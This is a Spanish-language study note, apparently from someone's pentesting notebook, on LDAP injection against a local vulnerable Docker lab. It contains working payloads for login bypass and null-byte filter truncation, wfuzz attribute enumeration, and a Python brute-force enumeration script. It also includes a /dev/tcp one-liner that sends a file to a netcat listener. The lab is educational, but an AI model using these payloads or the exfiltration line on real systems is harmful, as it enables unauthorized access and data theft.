------
- Tags: #web #vulnerabilidades 
----
# Definición

> Las inyecciones **LDAP** (**Protocolo Ligero de Acceso a Directorio**) son un tipo de ataque en el que se aprovechan las vulnerabilidades en las aplicaciones web que interactúan con un servidor LDAP. El servidor LDAP es un directorio que se utiliza para almacenar información de usuarios y recursos en una red.

La **inyección LDAP** funciona mediante la inserción de comandos LDAP maliciosos en los campos de entrada de una aplicación web, que luego son enviados al servidor LDAP para su procesamiento. Si la aplicación web no está diseñada adecuadamente para manejar la entrada del usuario, un atacante puede aprovechar esta debilidad para realizar operaciones no autorizadas en el servidor LDAP.

Al igual que las inyecciones SQL y NoSQL, las inyecciones LDAP pueden ser muy peligrosas. Algunos ejemplos de lo que un atacante podría lograr mediante una inyección LDAP incluyen:

- Acceder a información de usuarios o recursos que no debería tener acceso.
- Realizar cambios no autorizados en la base de datos del servidor LDAP, como agregar o eliminar usuarios o recursos.
- Realizar operaciones maliciosas en la red, como lanzar ataques de phishing o instalar software malicioso en los sistemas de la red.

**Para evitar** las inyecciones LDAP, las aplicaciones web que interactúan con un servidor LDAP deben validar y limpiar adecuadamente la entrada del usuario antes de enviarla al servidor LDAP. Esto incluye la validación de la sintaxis de los campos de entrada, la eliminación de caracteres especiales y la limitación de los comandos que pueden ser ejecutados en el servidor LDAP.

También es importante que las aplicaciones web se ejecuten con privilegios mínimos en la red y que se monitoreen regularmente las actividades del servidor LDAP para detectar posibles inyecciones.

Web con más información útil acerca del protocolo LDAP [aquí](https://www.profesionalreview.com/2019/01/05/ldap/)

El **puerto de conexión** para el protocolo LDAP es el **TCP 389,** aunque por supuesto, se podrá modificar por el usuario y establecerlo en el que desee si así se lo indica al servidor

-------
# Explotación de Inyección LDAP en laboratorio

Montaremos un entorno vulnerable con **Docker**, clonando el siguiente repositorio [https://github.com/motikan2010/LDAP-Injection-Vuln-App](https://github.com/motikan2010/LDAP-Injection-Vuln-App) y siguiendo las instrucciones dadas por el mismo.

A la hora de clonar el proyecto y hacer un ``docker build -t ldap-client-container .``, es probable que tras ejecutar la instrucción ``apt-get update``, nos salga un error que os impide construir la imagen correctamente.

Para evitar este problema, tan solo es necesario cambiar en el archivo ‘**Dockerfile**‘ la primera línea de ‘**FROM php:7.0-apache**‘ a ‘**FROM php:8.0-apache**‘. De esta forma, ya no tendremos problemas y el laboratorio se podrá desplegar correctamente.

----------

Luego de tener el panel de login ya montado en Docker, iremos al siguiente [link](https://blog.motikan2010.com/entry/2018/10/04/LDAP%E3%82%A4%E3%83%B3%E3%82%B8%E3%82%A7%E3%82%AF%E3%82%B7%E3%83%A7%E3%83%B3%E3%82%92%E3%81%97%E3%81%9F%E3%81%8B%E3%81%A3%E3%81%9F%E8%A9%B1) donde se detallará en una sección la siguiente línea:

- ``ldapsearch -x -H ldap://localhost -b dc=example,dc=org -D "cn=admin,dc=example,dc=org" -w admin 'cn=admin'``

Este comando se utiliza para **intentar autenticarnos en un servidor LDAP** que especifiquemos, proporcionando usuario y contraseña.

- **`ldapsearch`**: Este es el comando utilizado para realizar consultas LDAP (Lightweight Directory Access Protocol) desde la línea de comandos.
    
- **`-x`**: Este parámetro indica que se debe usar la autenticación simple en lugar de SASL (Simple Authentication and Security Layer). Es una forma de decirle a `ldapsearch` que no use mecanismos de autenticación más complejos o seguros.
    
- **`-H ldap://localhost`**: Especifica la URL del servidor LDAP al que se está conectando. En este caso, `ldap://localhost` indica que el servidor LDAP está corriendo en el mismo equipo donde se ejecuta el comando (`localhost`).
    
- **`-b dc=example,dc=org`**: Define la base de búsqueda para la consulta LDAP. En este caso, `dc=example,dc=org` es el punto de partida para la búsqueda en el directorio. `dc` significa "domain component" y se usa para especificar el dominio en el directorio LDAP.
    
- **`-D "cn=admin,dc=example,dc=org"`**: Proporciona el DN (Distinguished Name) del usuario que realiza la búsqueda, que en este caso es `cn=admin,dc=example,dc=org`. Este DN se usa para la autenticación y debe tener los permisos adecuados para realizar la consulta.
    
- **`-w admin`**: Especifica la contraseña para el DN proporcionado en el parámetro `-D`. En este caso, la contraseña es `admin`.
    
- **`'cn=admin'`**: Este es el filtro de búsqueda LDAP. En este caso, busca entradas que tengan el atributo `cn` (Common Name) igual a `admin`. Los filtros LDAP se usan para especificar los criterios que deben cumplir las entradas que se desean recuperar.

Esta información que nos brinda el comando anterior la obtenemos gracias a la web, pero si quisiéramos encontrar esto por nuestra cuenta, haríamos uso de la herramienta ``nmap`` para **escanear** utilizando scripts ya pre-definidos para **LDAP**.

Para encontrar los scripts de nmap de reconocimiento hacia el protocolo LDAP haremos uso del siguiente comando ``locate .nse | grep ldap`` ya que ``.nse`` es la terminación de los scripts de la herramienta nmap. 
Ahora haríamos uso del comando ``nmap --script ldap\* -p389 localhost`` para utilizar todos los scripts de nmap que contengan **LDAP** en su nombre, de esta forma encontraríamos el ``dc=example,dc=org``

Además del filtro ``'cn=admin'`` podemos aplicar filtros más complejos concatenándolo con un *and* ``&`` o un *or* ``|``, esto es lo que hace la web de manera automática para **validar las credenciales válidas de los usuarios**. 

Por ejemplo podríamos hacer la siguiente búsqueda.

![[LDAPI 1.png]]

En el caso anterior, nos brinda el mismo output ya que estamos haciéndolo con un mismo usuario, pero en un rato **crearemos más usuarios** para poder jugar un poco más.

-----

A la hora de **intentar loguearnos en la web** del contenedor, por detrás se esta empleando una **validación** de los datos proporcionados por nosotros, para entenderlo en profundidad iremos al archivo *index.php* del contenedor. 

Algo que se puede hacer si deseamos ver el código representado con colores es esto.
``nc -nlvp 443 | cat -l php`` en una consola aparte y enviarnos desde el contenedor el contenido del *index.php* con el comando ``cat index.php > /dev/tcp/192.168.0.193/443``

```php
<?php

session_start();

//LDAPの接続情報
const LDAP_HOST = "openldap-container";
const LDAP_PORT = 389;
const LDAP_DC = "dc=example,dc=org";
const LDAP_DN = "cn=admin,dc=example,dc=org";
const LDAP_PASS = "admin";

if (isset($_POST["logout"])) {
    session_destroy();
    header('Location: /', true , 301);
    exit;
}

if (isset($_POST["login"])) {
    $userId = $_POST['user_id'];
    $password = $_POST['password'];

    // エスケープ処理
    // $userId = ldap_escape($userId);
    // $password = ldap_escape($password);

    // LDAPに接続
    $ldapConn = ldap_connect(LDAP_HOST, LDAP_PORT);
    if (!$ldapConn) {
        exit('ldap_conn');
    }

    // バインド
    ldap_set_option($ldapConn, LDAP_OPT_PROTOCOL_VERSION, 3);
    $ldapBind = ldap_bind($ldapConn, LDAP_DN,LDAP_PASS);
    if ($ldapBind) {

        // ログイン処理
        $filter = '(&(cn=' . $userId . ')(userPassword=' . $password . '))'; // IDとパスワードのAND条件でフィルタを作成
        $ldapSearch = ldap_search($ldapConn, LDAP_DC, $filter);
        $getEntries = ldap_get_entries($ldapConn, $ldapSearch);
        if ($getEntries['count'] > 0) {
            // 成功
            $_SESSION["USERID"] = $userId;
            header('Location: /', true , 301);
            exit;
        }
    } else {
        // 失敗
    }
}

?>

<html>
<?= $_SESSION["USERID"] ?>さん こんにちは
<form action="/" method="POST">
    <label>User ID: </label><input type="text" name="user_id"/>
    <label>Password: </label><input type="password" name="password"/>
    <input type="hidden" name="login" value="1"/>
    <input type="submit" name="submit" value="Submit"/>
</form>

<form action="/" method="POST">
    <input type="hidden" name="logout" value="1"/>
    <input type="submit" value="Logout"/>
</form>
</html>
```

En concreto hay una linea que nos interesa la cual es ``(&(cn=' . $userId . ')(userPassword=' . $password . '))`` esta linea se asemeja al filtro de búsqueda que empleábamos anteriormente con el ``ldapsearch``, acá se indica que si el contador de entradas es mayor a "*0*", es decir, que existe contenido en la petición, entonces aplica un *Redirect*, de lo contrario dará un 200 OK ya que la web simplemente se actualizará, de esta manera se verifica si las credenciales son válidas o no.

----
## Login Bypass con uso de asteriscos

Para entender en profundidad lo que vamos a hacer, copiaremos esa linea que nos interesó y la meteremos en un archivo para poder analizarla y citar ejemplos.

```php
(&(cn=' . $userId . ')(userPassword=' . $password . ')) # ---------> Linea original

(&(cn=admin)(userPassword=admin)) # -----------> Asi se envia la petición en la web si pusieramos usuario 'admin' y contraseña 'admin'
```

Si no está aplicada una sanitización básica en cuanto al uso de asteriscos(``*``), en el campo ``userPassword`` podemos colocar uno para que nos involucre toda la contraseña, es decir que con el asterisco estas contemplando toda la data que en el match (Es decir los resultados del filtros que emplea la web por detrás) coincida con la contraseña, quedando tal que así **``(&(cn=admin)(userPassword=*))``**.

Probémoslo en la web *localhost:8888* del contenedor colocando "admin" en el campo *User ID*, y ``*`` en el campo *Password*.

![[LDAPI 2.png]]

Tuvimos éxito.

------

Vamos a abrir **Burpsuite** e interceptaremos la petición de Login y la enviaremos al *Repeater* como siempre porque esto lo podemos llevar a mucho mas.

![[LDAPI 3.png]]

Ahora si **probamos el uso de un asterisco en el campo de password** veremos la diferencia en el código de estado de la web, porque **entraremos satisfactoriamente a la cuenta de admin**.
==Recordemos que el código de estado es aplicado a este laboratorio, nosotros deberíamos guiarnos por mensajes de error o otro tipo de información brindada por la web==

![[LDAPI 4.png]]

------
## Enumeración de usuarios válidos con uso de asteriscos

También podríamos aplicar una enumeración de usuarios válidos en el campo *user_id* con el uso de asteriscos, por ejemplo podríamos colocar ``user_id=a*`` y si existe una coincidencia y la clave es válida (que en este caso lo es porque también utilizamos un ``*``) nos daría el **código de estado 301** porque hay un usuario que empieza con la letra "*a*" y posee mas contenido luego.

![[LDAPI 5.png]]

Esto ya nos permitiría **crear un script con Python3** como lo hicimos en las [[Inyecciones NOSQL]] para iterar por cada caracter y cuando la respuesta contenga un *código de estado "301"* ir almacenando ese caracter en una variable hasta tener todo el usuario. ==Cabe aclarar que esto no se podrá hacer con el campo password porque hay algo por detrás que no nos lo permitirá.==

## Utilización de Null Byte para comentar una petición

Imaginemos que nosotros disponemos de la cadena ``(&(cn=admin)(userPassword=*))``, y como nosotros en el caso anterior pudimos comprobar que podemos hacer uso de caracteres especiales en el campo ``cn=admin``, podríamos hacer lo siguiente ``(&(cn=admin)))(userPassword=*))``, es decir, cerraríamos al final del campo ``cn=admin`` con dos parentesis ``))``, esto lo que hace es cerrar la "query" para que **solo me interprete ese campo**, obviando el campo ``userPassword`` pero para que no haya ningún error, le agregamos un *Null Byte* (``%00``) para comentar todo el resto y de esa forma no se interprete, quedando todo de la siguiente manera.

- ``(&(cn=admin))%00)(userPassword=*))`` por lo tanto la web lo interpretará así ``(&(cn=admin))``

Esto significa que cuando proporcionamos esos datos a la web le estamos diciendo, el usuario es "admin" y ya está.

Esto lo podríamos aplicar desde el **Burpsuite** porque en la web nos dará un error.

![[LDAPI 6.png]]

Lo que haremos ahora será borrar el campo ``Cookie:`` para que **nos la aplique automáticamente luego de enviar la petición**, de esta forma tendremos la Cookie de la sesión iniciada de la cuenta "admin"

![[LDAPI 7.png]]

Luego le daríamos a *Follow Redirection* en el Burpsuite, y ahora lo que debemos hacer es copiar la Cookie otorgada y nosotros manualmente volver a agregar la Cookie en el lado de la petición.

![[LDAPI 8.png]]

----
## Creación de usuarios extra y enumeración de atributos de los mismos

Los usuarios existentes dentro de un servidor LDAP suelen tener *atributos*, estos pueden ser **email**, **description**, **telephoneNumber**, etc.

A continuación crearemos tres usuarios, para poner a prueba las Inyecciones LDAP obteniendo así los atributos de los usuarios creados.

Lo primero que haremos será ingresar en el contenedor correspondiente a ``openldap-container`` que está montado con Port Forwarding por el *puerto 389*, luego nos dirigiremos al directorio ``container/service/slapd/assets/test/`` donde habrá un archivo llamado ``new-user.ldif`` este es un ejemplo de una estructura para crear un usuario. Nosotros aprovecharemos la estructura para crear usuarios con datos que nosotros queramos.

Debemos copiar el contenido del archivo ``new-user.ldif`` y meterlo en una archivo que debemos crear llamado ``newuser.ldiff``

![[LDAPI 9.png]]

Ahora lo que haremos será modificar el archivo con los datos que queramos, en nuestro caso pondremos el nombre *C4sp* en donde aparezca *Billy*, además de agregar un numero de teléfono al final del todo como un nuevo atributo. ==Este atributo ya está incluido dentro de LDAP, para buscar todos los atributos existentes podemos hacer ..............................==

![[LDAPI 10.png]]

Una vez tengamos el archivo con los datos del nuevo usuario que queremos crear debemos subir este usuario a LDAP, para esto haremos uso del siguiente comando.

- ``ldapadd -x -H ldap://localhost -D "cn=admin,dc=example,dc=org" -w admin -f newuser.ldiff``

Donde con ``-f`` le pasaremos el archivo donde pusimos los atributos para el nuevo usuario.

![[LDAPI 11.png]]

De esta forma hemos **creado un nuevo usuario** llamado "c4sp" y podríamos autenticarnos en la web como el, ahora **repetiremos esto dos veces mas** con el mismo archivo, pero editándolo con otros usuarios con los datos que nosotros queramos. ==En mi caso hice un ``:%s/c4sp/pepe/g`` dentro del archivo para reemplazar el nombre "c4sp" por "pepe", y luego manualmente cambie el número de teléfono, luego hice lo mismo con "omar".==

De esta manera podríamos desde **Burpsuite** ir enumerando caracter por caracter para detectar usuarios válidos cuando la respuesta nos brinde un *301 (Redirect)*.

------

Ahora para enumerar algún atributo en especifico de un usuario existente lo que deberíamos hacer es **aplicar un reconocimiento de atributos**, esto lo podríamos hacer con la herramienta ``wfuzz``.

Debemos entender que nosotros a la hora de tener el ``(&(cn=admin)(userPassword=admin))`` lo que podemos hacer es agregar un atributo nuevo a la búsqueda, pero nosotros como atacantes no sabemos cuales son los atributos existentes para cada usuario, por lo tanto podríamos hacer ``(&(cn=admin)(FUZZ=*))%00(userPassword=admin))`` iterando con el diccionario **SecLists** en el campo *FUZZ* igualándolo a ``*`` para que nos de el contenido del atributo que encuentro el ``wfuzz`` y comentando el resto de la Query para que nos salteemos el campo de la contraseña.

Utilizaremos el siguiente **diccionario de SecLists**

![[LDAPI 12.png]]

Luego hacemos uso del **WFUZZ**, donde colocamos el diccionario y con ``-d`` especificamos que es data que estamos tramitando por POST, por lo tanto ahí debemos pegar el campo que está al final de nuestra petición en el Burpsuite y modificarlo para incluir el lugar donde se iterará con WFUZZ y luego comentar el resto de la Query.

![[LDAPI 13.png]]

- ``wfuzz -c -w /usr/share/SecLists/Fuzzing/LDAP-openldap-attributes.txt -d 'user_id=admin)(FUZZ=*))%00&password=*&login=1&submit=Submit' http://localhost:8888``

Esto nos dará muchos resultados con *código de estado 200 OK*, pero veremos que algunos nos dan el que nos interesa el cual es el *código de estado 301*, entonces lo que hacemos es agregarle al wfuzz el parámetro ``-hc`` para **esconder** los resultados con código de estado 200 OK.

![[LDAPI 14.png]]

Ahora que sabemos todos los atributos existentes, si por ejemplo **quisiéramos enumerar el atributo del número de teléfono** del usuario "c4sp", deberíamos reemplazar el diccionario anterior por uno de tipo ``range,0-9`` para que itere del numero cero al nueve, en donde nosotros coloquemos FUZZ.

- ``wfuzz -c --hc=200 -z range,0-9 -d 'user_id=c4sp)(telephoneNumber=FUZZ*))%00&password=*&login=1&submit=Submit' http://localhost:8888``

De esta forma estará iterando del *0-9* como **primer numero** y luego se concatena un ``*`` para que rellene el resto con el número real, por lo tanto cuando el *WFUZZ* detecte el *código de estado 301 Redirect*, nos dirá que número fue el que **coincidió** para esa respuesta, luego deberíamos ir colocando numero por numero hasta conseguir todo el teléfono completo.

![[LDAPI 15.png]]

![[LDAPI 16.png]]

![[LDAPI 17.png]]

---

Desde **Burpsuite** podríamos hacer lo mismo para enumerar el atributo de "*mail*" de la siguiente manera.

![[LDAPI 18.png]]

## Creando script en Python3 para automatizar inyección

```python
#!/usr/bin/python3

import requests
import time
import sys
import signal
import string

from pwn import *

# CTRL+C -----------------------------------
def def_handler(sig,frame):
    print("\n\n[!] Saliendo...\n")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)
# CTRL+C -----------------------------------

# Variables globales

main_url = "http://localhost:8888/"

def getInitialUsers():

    characters = string.ascii_lowercase + string.digits
    initial_users = []
    headers = {'Content-Type': 'application/x-www-form-urlencoded'}  # Cabecera obligatoria de incorporar, de lo contrario todos los status.code van a ser de 200

    for character in characters:
        post_data = "user_id={}*&password=*&login=1&submit=Submit".format(character)
        
        r = requests.post(main_url, data=post_data, headers=headers, allow_redirects=False)
        
        if r.status_code == 301:
            initial_users.append(character)   # Append se usa para meter contenido dentro de una LISTA, recordemos que initial_users más arriba es una lista.

    return initial_users # Return es para que nos muestre el contenido de la lista.

def getUsers(initial_users):

    characters = string.ascii_lowercase + string.digits
    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
    valid_users = []

    for first_character in initial_users:

        user = ""

        for position in range(0, 15):
            for character in characters:

                post_data = "user_id={}{}{}*&password=*&login=1&submit=Submit".format(first_character, user, character)

                r = requests.post(main_url, data=post_data, headers=headers, allow_redirects=False)

                if r.status_code == 301:

                    user+= character
                    break

        valid_users.append(first_character + user)

    print("")
    for user in valid_users:
        log.info("Usuario válido encontrado: %s" % user)
    print("")

    return valid_users

def getDescription(user):

    characters = string.ascii_lowercase + string.digits +' '
    headers = {'Content-Type': 'application/x-www-form-urlencoded'}

    atributo = ""

    p1 = log.progress("Fuerza bruta")
    p1.status("Iniciando proceso de fuerza bruta")
    time.sleep(2)

    p2 = log.progress("Atributo")


    for position in range(0,100):
        for character in characters:
            
            # Aca en telephoneNumber se coloca el atributo que quisieramos conseguir por fuerza bruta.
            post_data = "user_id={})(telephoneNumber={}{}*))%00&password=*&login=1&submit=Submit".format(user, atributo, character) 

            r = requests.post(main_url, data=post_data, headers=headers, allow_redirects=False)

            if r.status_code == 301:
                atributo += character
                p2.status(atributo)
                break

    p1.success("Proceso de fuerza bruta concluido")
    p2.success("El atributo del usuario es: %s" % atributo)

if __name__ == '__main__':

    initial_users = getInitialUsers()
    valid_users = getUsers(initial_users)

    for i in range (0,4):
        getDescription(valid_users[i])
```